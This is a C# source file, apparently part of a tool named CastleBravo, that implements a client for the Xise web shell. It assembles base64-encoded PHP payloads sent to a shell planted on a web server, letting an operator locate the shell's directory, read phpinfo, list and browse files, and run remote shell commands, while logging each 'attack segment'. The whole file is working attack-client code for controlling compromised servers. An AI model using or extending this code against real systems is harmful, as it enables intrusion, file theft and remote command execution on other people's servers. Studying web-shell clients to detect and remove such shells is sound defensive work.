using C2.Core;
using System;

namespace C2.Business.CastleBravo.WebShellTool
{
    class Xise19Client : CommonClient
    {
        String prefix2;
        String prefix3;
        public Xise19Client(string password, string clientSetting)
            : base(password, clientSetting)
        {
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE;
            prefix2 = password + "=" + this.clientSetting.PHP_MAKE2;
            prefix3 = password + "=" + this.clientSetting.PHP_MAKE3;
        }


        public override string PHPIndex()
        {
            string payload = prefix.Replace("@PARAM", clientSetting.PHP_INDEX);
          

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public override string PHPInfo()
        {
            string payload = prefix.Replace("@PARAM", clientSetting.PHP_INFO);
            //string payload = String.Format("{0}&PHP_INFO2={1}", prefix3, clientSetting.PHP_INFO2);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
              .AppendLine();

            return payload;
        }

        public override string PHPReadDict(string dict)
        {
            string attack = ST.DecodeBase64(clientSetting.PHP_READDICT).Replace("@PARAM2", dict);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));


            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("查询路径:{0}", ST.SuperDecodeBase64(dict)))
              .AppendLine();

            return payload;
        }

        public override string PHPShell(string shellEnv, string command)
        {

            string attack = ST.DecodeBase64(clientSetting.PHP_SHELL).Replace("@PARAM1", shellEnv).Replace("@PARAM2", command);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("执行路径:{0}", ST.SuperDecodeBase64(shellEnv)))
              .AppendLine(string.Format("命令:{0}", ST.SuperDecodeBase64(command)))
              .AppendLine();

            return payload;
        }
        public override string DetailInfo(string PageData)
        {
            string payload = String.Format("{0}&z0={1}&z1={2}&z9={3}",
                 prefix2,
                 clientSetting.z0,
                 ST.EncodeUrlBase64(PageData),
                 clientSetting.z9);
                
            sb.AppendLine("文件浏览:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix2))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(PageData)))
              .AppendLine();

            return payload;
        }
    }
}
